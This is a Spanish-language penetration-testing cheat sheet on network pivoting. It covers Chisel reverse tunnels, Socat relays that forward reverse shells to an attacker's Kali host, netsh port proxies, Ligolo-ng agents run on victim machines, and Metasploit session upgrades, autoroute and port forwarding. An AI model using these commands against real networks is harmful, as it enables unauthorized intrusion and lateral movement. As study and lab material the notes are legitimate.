# Pivoting

Propietario: Adrian Gisbert Cabello

# Chisel

Aplicación para hacer portforwarding

- Tenemos que tener chisel descomprimido (Linux) en Kali: `gunzip chisel_1.X.X_linux_arm64.gz`
- Le cambiamos el nombre a chisel para que sea más claro: `mv chisel_1.X.X_linux_arm64 chisel`
- Le damos permisos de ejecución: `chmod +x chisel`
- Comando para ponernos a escucha en el puerto 33 (máquina Kali): `./chisel server --reverse -p 33`
- Comando para ponerse en modo cliente tunelizando todos los puertos: `./chisel client 192.168.146.128:1234 R:socks`
- Comando para ponerse en modo cliente tunelizando 1 puerto: `./chisel client 192.168.146.128:1234 R:80:10.10.0.128:80`

# Socat

La idea es ejecutar Socat en la máquina intermedia (10.10.10.13) y obtener una reverse shell desde la máquina 2 (20.20.20.12) hasta la máquina intermedia (10.10.10.13) y gracias a socat poder enviar esa reverse shell a nuestra máquina Kali (10.10.10.12)

Vamos a compartir el archivo socat a la máquina intermedia (10.10.10.13) de la misma manera que hemos hecho para compartir chisel:

- Compartimos chisel a la primera máquina (10.10.10.13) con un servidor python3 desde la máquina Kali: `python3 -m http.server 5000`
- Descargamos en la máquina 10.10.10.13 con curl o wget el archivo socat
- Le damos permisos de ejecución: `chmod +x socat`
- Ejecutamos socat en la máquina intermedia: `./socat tcp-l:1111,fork,reuseaddr tcp:10.10.10.12:111`
    - Otro comando: `./socat TCP-LISTEN:1111,fork TCP:10.10.10.1:33`

- Esto significa que la reverse shell que reciba la máquina intermedia por el puerto 1111, lo va a enviar a nuestra máquina atacante (Kali) por el puerto 111
- Aconsejable hacerlo con los mismos números de cada máquina, si es la máquina 4: `./socat tcp-l:4444,fork,reuseaddr tcp:30.30.30.12:`444
- Nos tenemos que poner con netcat en nuestra máquina Kali y ponernos en escucha por el puerto 111: `nc -lvnp 111`

# Windows Netsh

**En el comando se configuran 4 parámetros, cada uno de ellos, sirve para lo siguiente:**

- **`listenport` –> Especificamos el puerto en el que Windows escuchará y que servirá como tunneling para la dirección y puerto que conectemos.**
- **`listenaddress` –> Especificamos la dirección de red en la que escuchará el puerto especificado en `listenport`. Esto indicará la interfaz en la que se escuchará.**
- **`connectport` –> Especificamos el puerto de la dirección a la que queremos llegar**
- **`connectaddress` –> Especificamos la dirección a la que queremos llegar**

```jsx
**netsh interface portproxy add v4tov4 listenport=<puerto a escuchar> listenaddress=<direccion a escuchar> connectport=<puerto a conectar> connectaddress=<direccion a conectar>**
```

Si ahora usamos el comando `netsh interface portproxy show all` podremos ver que se ha creado el túnel

Si quisiéramos eliminar/resetear la tabla de netsh (también se eliminan los registros), podríamos hacerlo con el siguiente comando: `netsh interface portproxy reset`

# Ligolo

Descargamos Ligolo-ng desde github: 

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Necesitaremos dos archivos, el **agent** y el **proxy**

- Agent Windows x64: https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip
- Proxy Linux x64: https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz

Ahora tenemos que descomprimir el agente `7z x ligolo-agent.zip` y el proxy `tar -xvf ligolo-proxy.tar`, le damos permisos de ejecución al proxy `chmod +x proxy` y lo movemos al directiorio de binarios `sudo mv proxy /usr/bin`

Primero pondremos en marcha el proxy:

- `sudo ip tuntap add user kali mode tun ligolo`
- `sudo ip link set ligolo`
- Hacemos un `ifconfig` para ver que se haya creado la interfaz correctamente
- En la máquina Kali: `proxy -selfcert`
    - Nos dice que está escuchando en el puerto 11601 (por ejemplo)
- Compartimos el agente a la máquina víctima
- Ejecutamos el agente: `agent.exe -connect LHOST:LPORT -retry -ignore-cert`
    - `agent.exe -connect 172.16.40.5:11601 -retry -ignore-cert`
- Ahora en el server proxy nos aparecerá que se ha conectado un host, escribimos: `session`
- Escribimos el número de la sesión que se haya creado y presionamos enter
- Nos aseguramos de las redes escribiendo `ifconfig`
- Escribimos `start`
- En una nueva terminal escribimos: `sudo ip route add 10.10.1.0/24 dev ligolo`
    - La ip es el nuevo rango de IP’s que anteriormente no teníamos acceso
- Si ahora hacemos un `ip route` confirmamos que se haya creado la ruta
- Ya podemos hacer ping a la máquina que no teníamos visibilidad anteriormente

# Metasploit

Para mediante una reverse shell conectarse a través de metasploit y luego poder upgradear a una sesión meterpreter, primero nos ponemos en modo escucha en metasploit con `use multi/handler`, ponemos el LHOST y LPORT y le damos a `run`. Una vez estamos en escucha, activamos la reverse shell en la máquina víctima y ya tendremos una sesión normal.

Ahora podemos hacer 2 cosas para levear la sesión a una sesión meterpreter:

1. `sessions -u 1` (tenemos que cambiar el 1 por el número de la sesión que queramnos levear)

2. `use shell_to_meterpreter`, ponemos el LHOST, LPORT y la SESSION. (una vez rellenados los datos le damos a `run` y se nos creará una nueva sesión meterpreter)

Cuando estamos dentro de una máquina, para saber los adaptadores de red que tiene:		**`*ip a*`** (linux) 	|	`ifconfig` (linux)		|	**`*ipconfig*`** (windows)   | `arp -a` (win/linux)

Para listar servicios conectados con otra máquina: 	`ss -natup`

Para hacer un escaneo de redes IP, podemos usar nmap o si no funcionara un script:		**`*nmap -sn 192.168.X.X/24*`**

Script Linux Ping Sweep: `for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done`

Scripts Windows Ping Sweep: `for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.`

Para añadir una ip a la tabla de rutas de nuestra máquina atacante y poder ver otros equipos en esas subredes podemos hacerlo de 3 maneras:

1. `use multi/manage/autoroute ----- show options ----- set SESSION X`

2. **`*run autoroute -s 192.168.X.0/24*`**	(aquí pondremos la nueva ip encontrada y su máscara de red, en este caso es /24 porque era 255.255.255.0)

3. Para añadir un segmento de red en meterpreter: `route add 192.168.X.0/24 2` (añadimos la ruta a la sesión 2)

Para visualizar la tabla de rutas: `route`

Para eliminar una ruta en la tabla de rutas: `route del 192.168.X.0/24 2` (borramos una ruta en la sesión 2)

Ya teniendo una shell en meterpreter (***shell***) en el caso de estar conectados a una víctima windows y si es linux no hace falta, podemos usar ***if/ip***config para ver los adaptadores de red que tiene la máquina, si tiene más de uno es que hay más máquinas que estan dentro de una subred.

Con el comando **`*arp -a*`**, vemos un mapa de todas las ip que está viendo la máquina víctima (podemos averiguar otras máquinas que esten en la subred).

Para comprobar la route_table tenemos que poner en ***background*** la sesión de meterpreter y cuando estemos en el msfconsole		→		**`*route print*`**

Para hacer escaneo de puertos en msfconsole:		**`*use auxiliary/scanner/portscan/tcp*`**		→		**`*show options*`**		→		**`*set rhost <ip del equipo en la subred>***`

→		**`*set ports 1-65000*`** (si queremos menos puertos y más rápido, p.ej: 1-1000)

Para hacer un port_forwarding en meterpreter:		**`*portfwd add -l 2233 -p 445 -r 192.168.224.X*`**		(significa que por nuestro puerto 2233 de la máquina atacante, veremos el puerto 445 de la máquina víctima

Para listar los puertos que hemos hecho port_forwarding:		**`*portfwd list*`**

Ahora podemos hacer un escaneo en nmap desde el terminal al puerto que hemos añadido:		**`*nmap -p2233 localhost*`**	o 	un escaneo más exaustivo	**`*nmap -sSCV -p2233 localhost*`**

[Little Pivoting Example](Pivoting/Little%20Pivoting%20Example.md)
